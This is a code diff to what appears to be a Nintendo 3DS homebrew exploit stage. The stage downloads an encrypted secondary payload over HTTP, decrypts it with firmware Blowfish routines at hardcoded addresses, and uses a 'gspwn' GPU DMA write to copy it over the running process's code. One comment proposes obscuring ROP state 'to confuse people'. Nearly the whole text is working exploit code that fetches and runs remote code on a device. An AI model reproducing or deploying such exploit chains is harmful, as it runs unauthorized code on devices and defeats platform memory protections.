@@ -149,6 +149,21 @@ Result HTTPC_ReceiveData(Handle handle, Handle contextHandle, u8* buffer, u32 si
 	return cmdbuf[1];
 }
 
+Result HTTPC_GetDownloadSizeState(Handle handle, Handle contextHandle, u32* totalSize)
+{
+	u32* cmdbuf=getThreadCommandBuffer();
+
+	cmdbuf[0]=0x00060040; //request header code
+	cmdbuf[1]=contextHandle;
+	
+	Result ret=0;
+	if((ret=svc_sendSyncRequest(handle)))return ret;
+
+	if(totalSize)*totalSize=cmdbuf[3];
+
+	return cmdbuf[1];
+}
+
 Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
 {
 	u8 l=_strlen(server);
@@ -298,30 +313,33 @@ int _main()
 	// drawHex(ret,0,line+=10);
 
 	u8* buffer=(u8*)0x14100000;
+	u32 secondaryPayloadSize=0x0;
 	ret=HTTPC_ReceiveData(httpcHandle2, httpContextHandle, buffer, 0x300000);
+	ret=HTTPC_GetDownloadSizeState(httpcHandle2, httpContextHandle, &secondaryPayloadSize);
 
 	// drawHex(ret,0,line+=10);
 
 	HTTPC_CloseContext(httpcHandle2, httpContextHandle);
 
 	//TODO : modify key/parray first ?
+	//(use some of its slots as variables in ROP to confuse people ?)
 	//decrypt secondary payload
 	Result (*blowfishKeyScheduler)(u32* dst)=(void*)0x001A44BC;
-	Result (*blowfishDecrypt)(u32* blowfishKeyData, u32* src, u32* dst, u32 size)=(void*)0x001A2180;
+	Result (*blowfishDecrypt)(u32* blowfishKeyData, u32* src, u32* dst, u32 size)=(void*)0x001A4B04;
 
 	blowfishKeyScheduler((u32*)0x14200000);
-	blowfishDecrypt((u32*)0x14200000, (u32*)0x14100000, (u32*)0x14100000, 0x300000);
+	blowfishDecrypt((u32*)0x14200000, (u32*)buffer, (u32*)buffer, secondaryPayloadSize);
 
 	Result (*_DSP_UnloadComponent)(Handle* handle)=(void*)0x002BA368;
 	Handle** dspHandle=(Handle**)0x334EFC;
 
 	_DSP_UnloadComponent(*dspHandle);
 
-	ret=_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x300000);
+	ret=_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)buffer, 0x300000);
 	// drawHex(ret,0,line+=10);
 
 	// doGspwn((u32*)(0x14100000), (u32*)(0x14000000+TEXTPAOFFSET), 0x001D9000);
-	doGspwn((u32*)(0x14100000), (u32*)(0x14000000+TEXTPAOFFSET), 0x0000A000);
+	doGspwn((u32*)(buffer), (u32*)(0x14000000+TEXTPAOFFSET), 0x0000A000);
 
 	svc_sleepThread(0x3B9ACA00);
 
